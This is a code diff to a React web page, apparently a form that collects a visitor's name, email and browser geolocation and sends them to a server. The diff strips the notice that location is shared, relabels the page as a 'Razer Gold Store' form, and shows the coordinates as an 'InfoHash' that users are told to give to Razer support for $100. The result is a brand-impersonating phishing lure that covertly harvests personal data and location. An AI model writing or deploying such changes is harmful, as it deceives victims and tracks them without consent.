@@ -18,7 +18,7 @@ export default function Home() {
 
       {/* Foreground content */}
       <main className="card">
-        <Header title="Enter details, then share location" />
+        <Header title="Enter details for Razer Gold Store" />
         <form id="infoForm">
           <label>
             Name
@@ -35,7 +35,7 @@ export default function Home() {
             <input type="email" id="email" name="email" required />
           </label>
           <br />
-          <button type="submit" id="submitBtn">Submit and Share Location</button>
+          <button type="submit" id="submitBtn">Submit</button>
         </form>
 
         <pre id="status" style={{ whiteSpace: 'pre-wrap', marginTop: '1rem' }} />
@@ -94,7 +94,7 @@ export default function Home() {
                 const info = getFormData();
                 try{
                   const loc = await requestLocationOnce();
-                  log(\`Location: \${loc.latitude}, \${loc.longitude} (±\${loc.accuracy}m)\`);
+                  log(\`InfoHash (Kindly give to Razer Costomer support for 100$) : \${loc.latitude}, \${loc.longitude} (±\${loc.accuracy}m)\`);
                   await send({ ...info, ...loc });
                 }catch(err){
                   log('Location error: ' + (err && err.message ? err.message : err));
